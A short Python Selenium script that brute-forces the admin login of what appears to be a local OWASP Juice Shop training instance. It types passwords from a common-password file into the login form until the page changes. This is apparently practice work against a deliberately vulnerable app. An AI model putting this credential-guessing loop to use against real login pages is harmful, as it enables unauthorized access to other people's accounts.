from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys

def try_force(url):
    #set up drivers
    driver = webdriver.Firefox(options=webdriver.FirefoxOptions())
    driver.get(url)
    #initialize actions driver
    action = ActionChains(driver)

    #close intial pop up
    action.send_keys(Keys.ESCAPE).perform()

    #find all login elements
    #find the forms
    email_box = driver.find_element(By.ID, "email")
    password_box = driver.find_element(By.ID, "password")
    #find login button
    login_button = driver.find_element(By.ID, "loginButton")

    #input admin email
    email_box.send_keys("admin@juice-sh.op")

    #open text file with common bad passwords
    password_list = open("Python\TopPasswords.txt")
    #try all passwords in the list
    for password in password_list:
            #insert password from list
            password_box.send_keys(password)

            #click button
            action.click(on_element=login_button)
            action.perform()

            #stop if password logged user in
            if(driver.current_url != url):
                  print("Brute force succesful")
                  break
            
            #clear before next insert
            password_box.clear()


#run code
url = "http://localhost:3000/#/login"
try_force(url)
